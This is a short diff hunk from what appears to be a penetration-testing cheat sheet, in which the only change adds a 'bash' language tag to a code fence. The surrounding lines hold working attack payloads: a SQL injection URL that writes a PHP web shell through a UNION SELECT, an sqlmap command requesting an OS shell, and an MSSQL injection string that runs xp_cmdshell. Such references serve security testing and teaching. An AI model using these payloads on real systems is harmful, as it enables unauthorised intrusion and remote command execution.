@@ -243,7 +243,7 @@ http://target/index.php?vulnParam=0' UNION ALL SELECT 1,"<?php system($_REQUEST[
 sqlmap -r post-request -p item --level=5 --risk=3 --dbms=mysql --os-shell --threads 10
 ```
 
-```
+```bash
 # mssql cmdshell execution via SQL injection
 1000';+exec+master.dbo.xp_cmdshell+'ping+10.11.0.245';--
 ```
